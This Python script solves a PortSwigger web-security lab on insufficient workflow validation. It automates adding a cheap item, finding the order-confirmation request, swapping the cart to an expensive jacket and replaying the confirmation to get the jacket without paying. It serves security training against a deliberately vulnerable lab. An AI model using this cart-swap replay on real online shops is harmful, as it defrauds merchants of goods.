# Lab 08 — Insufficient workflow validation
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation
#
# Vulnerability: The order-confirmation step doesn't re-verify what was
#                actually paid for — it just finalises whatever is
#                CURRENTLY in the cart at confirmation time
# Aim:           Buy the "Lightweight l33t leather jacket" without paying
#                for it
#
# Technique:
#   1. Buy a CHEAP item through the normal checkout flow, capturing the
#      final GET "confirm order" request WITHOUT letting it complete yet
#      (or note its exact URL/parameters to replay manually).
#   2. Swap the cart contents to the EXPENSIVE jacket instead.
#   3. Replay the captured confirmation request — it finalises whatever is
#      currently in the cart, not what was originally paid for.
#
# Usage: python business_logic_lab08.py <url>

import sys
import re
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   find_product_id, add_to_cart, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 08 — INSUFFICIENT WORKFLOW VALIDATION")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab08.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: find a cheap product and buy it normally ─────────────────────
    print("\n  ── Step 1: find a cheap product and add it to the cart\n")
    home = session.get(url)
    # Look for any product with a low price to use as the "affordable" item
    cheap_match = re.search(r'productId=(\d+)[^"]*"[^>]*>\s*[^<]*\$(\d{1,2}\.\d{2})', home.text)
    if cheap_match:
        cheap_id = cheap_match.group(1)
        print(f"  ✔  Found a cheap product candidate: productId={cheap_id}")
    else:
        cheap_id = input("  Enter a cheap product ID manually: ").strip()

    add_to_cart(session, url, cheap_id, quantity=1)
    print(f"  ✔  Added product {cheap_id} to cart")

    # ── Step 2: begin checkout to discover the confirmation URL shape ────────
    print("\n  ── Step 2: begin checkout to discover the confirmation request\n")
    r_checkout_start = session.post(f"{url}/cart/checkout")
    print(f"  ℹ  Checkout POST status: {r_checkout_start.status_code}")

    # Look for a link/redirect to an order-confirm endpoint
    confirm_match = re.search(r'(/cart/order-confirmation[^"\'\s]*)', r_checkout_start.text)
    if not confirm_match:
        confirm_match = re.search(r'(/order-confirmation[^"\'\s]*)', r_checkout_start.text)

    if not confirm_match:
        print("  ✘  Could not auto-discover the order-confirmation URL.")
        print("     Complete a normal purchase manually in Burp, capture the")
        print("     final GET request (order-confirmation), and note its full")
        print("     URL including any query parameters — then adapt this script.")
        sys.exit(1)

    confirm_path = confirm_match.group(1)
    print(f"  ✔  Discovered confirmation path: {confirm_path}\n")

    # ── Step 3: swap the cart to the jacket BEFORE replaying confirmation ───
    print("  ── Step 3: swap cart contents to the leather jacket\n")
    jacket_id = find_product_id(session, url)

    # Clear cart first if possible, then add the jacket
    session.post(f"{url}/cart", data={"productId": cheap_id, "redir": "PRODUCT", "quantity": "0"})
    add_to_cart(session, url, jacket_id, quantity=1)
    print(f"  ✔  Cart now contains the jacket (productId={jacket_id})")

    # ── Step 4: replay the captured confirmation request ─────────────────────
    print(f"\n  ── Step 4: replay the confirmation request against the swapped cart\n")
    r_confirm = session.get(f"{url}{confirm_path}")
    check_status(r_confirm, 200, "Replayed order confirmation")
    print_box("Confirmation response (truncated)", r_confirm.text[:400])

    print()
    print("  ℹ  The confirmation step never re-verified WHAT was paid for —")
    print("     it just finalised whatever was CURRENTLY in the cart when")
    print("     the confirmation request was replayed. If this didn't work,")
    print("     confirm the exact confirmation URL/params manually in Burp")
    print("     first, then adjust the confirm_path detection above.")
